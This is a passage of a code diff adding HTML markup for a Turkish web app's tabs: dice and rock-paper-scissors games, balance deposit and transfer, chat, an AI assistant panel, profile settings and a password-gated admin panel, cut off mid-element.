+                            <div id="diceLeft" style="font-size:13px;color:var(--text-muted);margin-top:4px;">Kalan: <span id="diceRemain">4</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- RPS -->
+                <div id="tab-rps" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-hand-rock" style="color:#007aff;margin-right:10px;"></i>Taş Kağıt Makas (5 TL)</h3></div>
+                        <div class="card-body" style="text-align:center;">
+                            <div style="font-size:48px;margin:8px 0;" id="rpsResult">🤜</div>
+                            <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;"><button class="btn" id="rpsRock">🪨 Taş</button><button class="btn" id="rpsPaper">📄 Kağıt</button><button class="btn" id="rpsScissors">✂️ Makas</button></div>
+                            <div id="rpsStatus" style="margin-top:12px;font-size:14px;color:var(--text-muted);"></div>
+                            <div id="rpsLeft" style="font-size:13px;color:var(--text-muted);margin-top:4px;">Kalan: <span id="rpsRemain">4</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BALANCE -->
+                <div id="tab-bakiye" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-wallet" style="color:#007aff;margin-right:10px;"></i>Bakiye Yönetimi</h3></div>
+                        <div class="card-body">
+                            <div style="background:var(--bg-input);border-radius:var(--radius-sm);padding:16px;border:1px solid var(--border-color);">
+                                <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-color);"><span>Mevcut Bakiye</span><strong id="currentBalance">0.00 TL</strong></div>
+                                <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-color);"><span>ID</span><strong id="userIdDisplay">-</strong></div>
+                                <div style="margin-top:12px;display:flex;gap:10px;flex-wrap:wrap;">
+                                    <div style="flex:1;min-width:150px;"><input type="number" id="depositAmount" placeholder="Miktar" style="width:100%;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /><button class="btn" style="width:100%;margin-top:6px;" onclick="window.deposit()">Yükle</button></div>
+                                    <div style="flex:1;min-width:150px;"><input type="text" id="transferId" placeholder="Alıcı ID" style="width:100%;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /><input type="number" id="transferAmount" placeholder="Miktar" style="width:100%;padding:10px;margin-top:4px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /><button class="btn" style="width:100%;margin-top:6px;" onclick="window.transfer()">Transfer</button></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CHAT -->
+                <div id="tab-chat" class="tab-content hidden">
+                    <div class="card" style="display:flex;flex-direction:column;height:500px;">
+                        <div class="card-header"><h3><i class="fas fa-comment-dots" style="color:#007aff;margin-right:10px;"></i>Sohbet Odası</h3></div>
+                        <div class="card-body" style="flex:1;display:flex;flex-direction:column;">
+                            <div id="chatMessages" style="flex:1;overflow-y:auto;background:var(--bg-input);border-radius:8px;padding:12px;border:2px solid var(--border-color);min-height:300px;max-height:400px;"></div>
+                            <div style="display:flex;gap:10px;margin-top:10px;"><input type="text" id="chatInput" placeholder="Mesaj..." style="flex:1;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /><button class="btn" id="sendChatBtn"><i class="fas fa-paper-plane"></i> Gönder</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- AI -->
+                <div id="tab-ai" class="tab-content hidden">
+                    <div class="card" style="display:flex;flex-direction:column;height:500px;">
+                        <div class="card-header"><h3><i class="fas fa-robot" style="color:#007aff;margin-right:10px;"></i>Zenit AI Asistan</h3></div>
+                        <div class="card-body" style="flex:1;display:flex;flex-direction:column;">
+                            <div id="aiMessages" style="flex:1;overflow-y:auto;background:var(--bg-input);border-radius:8px;padding:12px;border:2px solid var(--border-color);min-height:300px;max-height:400px;"></div>
+                            <div style="display:flex;gap:10px;margin-top:10px;"><input type="text" id="aiInput" placeholder="AI'ya sor..." style="flex:1;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /><button class="btn" id="sendAiBtn"><i class="fas fa-paper-plane"></i> Sor</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SETTINGS -->
+                <div id="tab-ayarlar" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-cog" style="color:#007aff;margin-right:10px;"></i>Profil Ayarları</h3></div>
+                        <div class="card-body">
+                            <div class="settings-grid">
+                                <div class="settings-group"><label>Profil Fotoğrafı</label><div style="display:flex;align-items:center;gap:16px;"><img id="profileAvatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='80' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' rx='40' fill='%23007aff'/%3E%3Ctext x='40' y='52' text-anchor='middle' font-size='32' fill='white' font-weight='600' font-family='Arial'%3EM%3C/text%3E%3C/svg%3E" style="width:80px;height:80px;border-radius:50%;object-fit:cover;border:2px solid var(--border-color);" /><input type="file" id="avatarUpload" accept="image/*" style="padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /></div></div>
+                                <div class="settings-group"><label>Kullanıcı Adı</label><input type="text" id="displayName" placeholder="Adın" style="width:100%;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /></div>
+                                <div class="settings-group"><label>Bio</label><textarea id="userBio" placeholder="Kendini tanıt..." rows="2" style="width:100%;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);font-family:var(--font);resize:vertical;"></textarea></div>
+                                <div class="settings-group"><label>ID</label><input type="text" id="profileId" readonly style="width:100%;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-muted);" /></div>
+                                <div class="settings-group"><label>Şifre Değiştir</label><input type="password" id="changePasswordInput" placeholder="Yeni şifre" style="width:100%;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /></div>
+                                <div class="settings-group"><label>Tema</label><select id="themeSelect" style="width:100%;padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);"><option value="light">Aydınlık</option><option value="dark" selected>Karanlık</option></select></div>
+                            </div>
+                            <button class="btn" id="saveProfileBtn"><i class="fas fa-save"></i> Kaydet</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ADMIN -->
+                <div id="tab-admin" class="tab-content hidden">
+                    <div class="card">
+                        <div class="card-header"><h3><i class="fas fa-shield-alt" style="color:#ff9500;margin-right:10px;"></i>Admin Paneli</h3></div>
+                        <div class="card-body">
+                            <div id="adminLock" style="text-align:center;padding:20px;">
+                                <p style="margin-bottom:12px;">Admin paneline erişmek için şifreyi girin.</p>
+                                <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap;"><input type="password" id="adminPassInput" placeholder="Admin şifresi" style="padding:10px;background:var(--bg-input);border-radius:8px;border:2px solid var(--border-color);color:var(--text-primary);" /><button class="btn" id="adminUnlockBtn">Giriş</button></div>
+                                <div id="adminLockError" style="color:#ff3b30;margin-top:8px;display:none;">Şifre hatalı!</div>
+                            </div>
+                            <div id="adminContent" style="display:none;">
+                                <div style="background:var(--bg-input);border-radius:8px;padding:16px;border:2px solid var(--border-color);margin-bottom:16px;"><p><strong>🔑 Kayıt Anahtarı Oluştur</strong></p><div style="display:flex;gap:10px;margin-top:8px;
